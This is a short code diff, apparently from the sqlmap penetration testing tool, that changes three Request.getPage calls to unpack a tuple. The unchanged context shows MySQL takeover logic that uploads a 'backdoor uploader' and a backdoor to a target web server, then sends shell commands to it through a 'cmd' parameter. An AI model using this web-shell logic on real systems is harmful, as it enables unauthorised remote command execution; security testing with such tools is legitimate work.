@@ -450,7 +450,7 @@ class MySQLMap(Fingerprint, Enumeration, Filesystem, Takeover):
 
             baseUrl = "%s://%s:%d%s" % (conf.scheme, conf.hostname, conf.port, requestDir)
             uploaderUrl = "%s/%s" % (baseUrl, uploaderName)
-            page = Request.getPage(url=uploaderUrl, direct=True)
+            page, _ = Request.getPage(url=uploaderUrl, direct=True)
 
             if "sqlmap backdoor uploader" not in page:
                 warnMsg  = "unable to upload the uploader "
@@ -470,7 +470,7 @@ class MySQLMap(Fingerprint, Enumeration, Filesystem, Takeover):
                                 "uploadDir": directory,
                               }
             uploaderUrl = "%s/%s" % (baseUrl, uploaderName)
-            page = Request.getPage(url=uploaderUrl, multipart=multipartParams)
+            page, _ = Request.getPage(url=uploaderUrl, multipart=multipartParams)
 
             if "Backdoor uploaded" not in page:
                 warnMsg  = "unable to upload the backdoor through "
@@ -522,7 +522,7 @@ class MySQLMap(Fingerprint, Enumeration, Filesystem, Takeover):
                     break
 
                 cmdUrl = "%s?cmd=%s" % (backdoorUrl, command)
-                page = Request.getPage(url=cmdUrl, direct=True)
+                page, _ = Request.getPage(url=cmdUrl, direct=True)
                 output = re.search("<pre>(.+?)</pre>", page, re.I | re.S)
 
                 if output:
